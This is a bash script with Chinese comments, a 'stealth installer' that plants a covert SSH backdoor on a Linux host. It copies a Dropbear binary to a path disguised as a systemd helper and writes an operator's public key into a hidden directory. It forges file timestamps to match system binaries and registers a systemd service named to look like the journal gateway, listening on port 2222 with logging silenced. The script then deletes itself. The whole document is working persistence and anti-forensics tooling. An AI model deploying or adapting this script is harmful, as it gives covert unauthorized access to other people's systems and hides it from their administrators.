#!/bin/bash

# ==========================================
#  Dropbear Static Stealth Installer (Ed25519 Support)
# ==========================================

# --- [1] 在这里填入你的 SSH 公钥 (必填) ---
# 支持 ssh-rsa 或 ssh-ed25519 开头
YOUR_PUB_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC..." 

# --- [2] 核心配置 ---
SRC_BIN="./dropbear"
# 伪装后的二进制路径
DEST_BIN="/usr/lib/systemd/systemd-journal-gatewayd-helper"
# 隐蔽的配置目录
HIDDEN_CONF_DIR="/usr/lib/systemd/system-journal-gatewayd.d"
HIDDEN_KEY_FILE="$HIDDEN_CONF_DIR/authorized_keys"

# 伪装服务名
SVC_NAME="systemd-journal-helper.service"
SVC_PATH="/etc/systemd/system/${SVC_NAME}"
# 监听端口
PORT="2222"
# 时间戳参考文件
TIME_REF="/usr/bin/systemctl"

# --- 环境检查 ---
if [ "$EUID" -ne 0 ]; then
  echo "Error: Must be run as root."
  exit 1
fi

if [ ! -f "$SRC_BIN" ]; then
  echo "Error: '$SRC_BIN' not found."
  exit 1
fi

# --- 关键修改：支持 ssh-ed25519 的检查逻辑 ---
if [[ "$YOUR_PUB_KEY" != ssh-* ]]; then
    echo "Warning: 公钥格式似乎不正确！"
    echo "请确保 YOUR_PUB_KEY 以 'ssh-rsa' 或 'ssh-ed25519' 开头。"
    exit 1
fi

# --- 1. 清理旧服务 ---
if systemctl is-active --quiet "$SVC_NAME"; then
    systemctl stop "$SVC_NAME"
    systemctl disable "$SVC_NAME" >/dev/null 2>&1
fi

# --- 2. 部署二进制文件 ---
echo "[*] Deploying binary..."
cp "$SRC_BIN" "$DEST_BIN"
chmod +x "$DEST_BIN"
touch -r "$TIME_REF" "$DEST_BIN"

# --- 3. 部署 Authorized Keys ---
echo "[*] Creating hidden key store..."
mkdir -p "$HIDDEN_CONF_DIR"
echo "$YOUR_PUB_KEY" > "$HIDDEN_KEY_FILE"
chmod 600 "$HIDDEN_KEY_FILE"
# 伪造时间戳
touch -r "$TIME_REF" "$HIDDEN_KEY_FILE"
touch -r "$TIME_REF" "$HIDDEN_CONF_DIR"
# --- 4. 配置 SFTP 支持 ---
echo "[*] Configuring SFTP support..."
# Dropbear 默认在 /usr/libexec/sftp-server 寻找 SFTP 解释器
# 这里的 ln -s 确保了你可以通过 WinSCP 或 FileZilla 管理文件
if [ -f "/usr/lib/openssh/sftp-server" ]; then
    mkdir -p /usr/libexec
    ln -sf /usr/lib/openssh/sftp-server /usr/libexec/sftp-server
    # 同样伪造软链接的时间戳
    touch -h -r "$TIME_REF" /usr/libexec/sftp-server
    echo "    SFTP support enabled via OpenSSH provider."
elif [ -f "/usr/lib/ssh/sftp-server" ]; then
    mkdir -p /usr/libexec
    ln -sf /usr/lib/ssh/sftp-server /usr/libexec/sftp-server
    touch -h -r "$TIME_REF" /usr/libexec/sftp-server
    echo "    SFTP support enabled via alternative provider."
fi
# --- 5. 创建 Systemd 服务 ---
echo "[*] Configuring persistence..."
cat <<EOF > "$SVC_PATH"
[Unit]
Description=System Journal Gateway Helper Service
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
# -D 指定公钥目录 (需配合修改版 Dropbear 或确保目录权限正确)
ExecStart=$DEST_BIN -D -F "$HIDDEN_CONF_DIR" -p $PORT -R

Restart=always
RestartSec=5s
ExecStartPre=/bin/sh -c 'echo "Initializing helper..."'

# 基础隐蔽
WorkingDirectory=/
NoNewPrivileges=yes
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# 伪造服务文件时间
if [ -f "/lib/systemd/system/ssh.service" ]; then
    touch -r "/lib/systemd/system/ssh.service" "$SVC_PATH"
else
    touch -r "$TIME_REF" "$SVC_PATH"
fi

# --- 5. 激活服务 ---
echo "[*] Activating..."
systemctl daemon-reload
systemctl enable "$SVC_NAME" >/dev/null 2>&1
systemctl start "$SVC_NAME"

# --- 6. 验证与自毁 ---
sleep 2
if systemctl is-active --quiet "$SVC_NAME"; then
    echo "SUCCESS: Persistence established."
    echo "    Port: $PORT"
    echo "    Key:  $HIDDEN_KEY_FILE"
    echo "[*] Self-destructing installer..."
    rm -- "$0"
else
    echo "FAILED: Service did not start."
    systemctl status "$SVC_NAME" --no-pager
    exit 1
fi
